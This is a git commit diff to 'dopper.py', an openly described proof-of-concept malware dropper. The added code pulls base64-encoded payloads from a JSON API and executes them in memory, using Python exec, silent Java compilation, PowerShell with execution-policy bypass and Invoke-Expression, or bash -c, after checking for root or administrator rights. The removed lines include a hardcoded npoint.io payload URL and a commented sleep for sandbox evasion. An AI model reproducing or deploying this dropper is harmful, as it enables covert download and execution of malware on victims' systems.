622a513791b37a84d729dcb85c87c421b2af834c
Dor <108623675+D0rDa4aN919@users.noreply.github.com>
2023-08-13 00:01:35 +0300

    Update dopper.py

--- dopper.py
+++ dopper.py
@@ -1,104 +1,180 @@
 ##############################################################################
 # Offline Py-JSON-Dropper - dropper - Python Script
-# Description: A POC for JSON dropper(drop by fetching API JSON). It will ask for malware path and create a new json file with encode malware bodies.
+# Description: A POC for JSON dropper(drop by fetching API JSON). It will ask for malware path and create a new json file with encode malware bodies, 
+# for final it will execute the malware based on the extention(ps1/sh/java/python) using in memory execution.
 # Author: Dor Dahan
 # License: MIT (See details in the LICENSE file or at the end of this script)
 ##############################################################################
 
-import pip, platform, os, time
+import base64
+import ctypes
+import os
+import pip
+import platform
+import subprocess
+import tempfile
 
 # Check the operating system
-OS= platform.system()
+OS = platform.system()
 WIN = False
-LINUX = False
+LIN = False
 if OS == "Windows":
     WIN = True
 elif OS == "Linux":
     LIN = True
-# The API url fetch the json dropper
-URL = "https://api.npoint.io/531896996f8103fa82c3"
+    
+# The API url you used for fetch the json malware
+URL = ""
+
 # The pip packages to install
 packages = ["requests"]
 
 def install_package(package_name):
     """
     Will install the packages requirements for the script to run.
-    :param package_name: The package name
-    :return:
+    :param package_name: The package name.
+    :return: None
     """
     while True:
         try:
             pip.main(["install", package_name])
             break
+        except ImportError:
+            continue
         except Exception:
             continue
 
-def execute_process(program, index):
+def find_main_methods(java_code):
+    lines = java_code.splitlines()
+    in_main_method = False
+    class_name = None
+    for line in lines:
+        # Remove leading/trailing spaces and ignore comments
+        line = line.strip()
+        if not line.startswith("//"):
+            # Check if the line contains the main method declaration
+            if "public static void main(String[] args)" in line:
+                in_main_method = True
+            # Check if a class declaration is found
+            if line.startswith("public class "):
+                class_name = line.split()[2]  # Extract the class name
+            # Check if the class contains the main method
+            if in_main_method and class_name:
+                return class_name
+            return None
+
+def execute_process(script_content: bytes, extension: str, malware: str) -> None:
     """
     Will check the OS and will act as need to the OS.
-    :param program: The malware name
-    :param index: The index number of the name
+    :param script_content: The encoded binary of the malware
+    :param extension: The file extension.
+    :param malware: The encoded string of the malware.
     :return:
     """
-    import subprocess
-    while True:
-        try:
-            if WIN:
-                if not program.endswith(".exe"):
-                    subprocess.run([program], check=True)
-                ## If you want to use other script that are not exe file
-                # else:
-                #     with open(f"execute{index}.bat", "w") as file:
-                #         file.write(f'@{programming_language} {program}')
-                #     subprocess.run(["execute.bat"], check=True, shell=True)
-                break
-            elif LIN:
-                subprocess.run(["chmod", "+x", program], check=True)
-                subprocess.run([program], check=True)
-                break
-        except subprocess.CalledProcessError:
-            continue
+    # Check which extension the malware use
+    if extension.lower() == "py":
+        # Run a python script
+        exec(script_content.decode("utf-8"))
+    elif extension.lower() == "java":
+        # # Take note that if the target doesn't have a JDK this option will not work
+        # Finding the main function of the java code
+        class_name = find_main_methods(script_content.decode("utf-8"))
+        if class_name is None:
+            exit()
+        # Create a new directory for java compile
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # Write the Java code to a temporary file for compilation
+            java_file_path = temp_dir + '/' + class_name + '.java'
+            with open(java_file_path, 'w') as java_file:
+                java_file.write(script_content.decode("utf-8"))
+            # Compile and run the Java code, sending output to /dev/null
+            with open(os.devnull, 'w') as null:
+                compile_command = ["javac", "-d", temp_dir, java_file_path]
+                subprocess.run(compile_command, check=True, stdout=null, stderr=null)
+                run_command = ["java", "-cp", temp_dir, class_name]
+                subprocess.run(run_command, text=True, check=True, stdout=null, stderr=null)
+    else:
+        if WIN:
+            # If the system is Windows
+            if extension.lower() == "ps1":
+                # Run a powershell script from the IEX
+                powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-Command',
+                                      f"$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{malware}')); Invoke-Expression $script"]
+                execution(powershell_command)
+        elif LIN:
+            # If the system is Linux
+            if extension.lower() == "sh":
+                # Run the bash script using one-liner command
+                final_command = ["/bin/bash", "-c", script_content.decode("utf-8")]
+                execution(final_command)
+
+def execution(command: str) -> None:
+    """
+    Will execute the command using Shell
+    :param command: The command to execute
+    """
+    try:
+        if WIN:
+            subprocess.run(command, shell=False, check=True)
+        elif LIN:
+            subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    except subprocess.CalledProcessError:
+        return
 
 def main():
-    import base64, requests
     # Getting the response from the api server
     response = requests.get(url=URL).json()
-    names = []
+
     # Looping throw the keys in the json format
     for index, key in enumerate(response):
+
         # Create new file name via the index and file name
         filename = response[key]["fullName"].split(".")
         extension = filename[-1]
-        # check if there is more than one dot in the file name
-        if len(filename) > 2:
-            filename = ".".join(filename[:-1])
-        # Inserting the malware body into the new file name
-        with open(f"{filename[0]}_{index}.{extension}", "wb") as file:
-            # Fetch the body of the malware
-            malware = response[key]["body"]
-            # Encoding the body back to binary format
-            decoded = malware.encode("utf-8")
-            # Decoding the body to insert into the file
-            decoded = base64.b32decode(decoded)
-            names.append(f"{filename[0]}_{index}.{extension}")
-            file.write(decoded)
-    # ## If you enter this to dropper for execution after downloading
-    ## For create a time interval between the download and the execution (bypass sandbox check)
-    # time.sleep(10000)
-    ## will execute the script by the order of download
-    # for index, program in enumerate(names):
-    #     execute_process(program, index)
-    ## delete the bat file that are created
-    # for index in range(len(names)):
-    #     if os.path.isfile(f"execute{index}.bat"):
-    #         os.remove(f"execute{index}.bat")
 
+        # Fetch the body of the malware and decode it
+        malware = response[key]["body"]
+        encode = malware.encode("utf-8")
+        decoded = base64.b64decode(encode)
+        
+        # send to the execution process that will execute the script via in memory execution.
+        execute_process(decoded, extension, malware)
 
+def win_admin():
+    """
+    Check if the user is administrator or regular user (Windows system only)
+    :return: True/False
+    """
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except ctypes.WinError:
+        return False
+
+def lin_user():
+    """
+    Check if the user is root or regular user (Linux system only)
+    :return: True/False.
+    """
+    from getpass import getuser
+    if getuser() == "root":
+        return True
+    else:
+        return False
 
 if __name__ == '__main__':
     # Install packages
     for package in packages:
         install_package(package)
+    # Administrator/root check
+    if LIN:
+        if not lin_user():
+            print("Need root permissions")
+            exit(1)
+    elif WIN:
+        if not win_admin():
+            print("Need administrator permissions")
+            exit(1)
+    import requests
     # Start the script
     main()
 
@@ -116,7 +192,7 @@ if __name__ == '__main__':
 # copies or substantial portions of the Software.
 # THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
 # AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
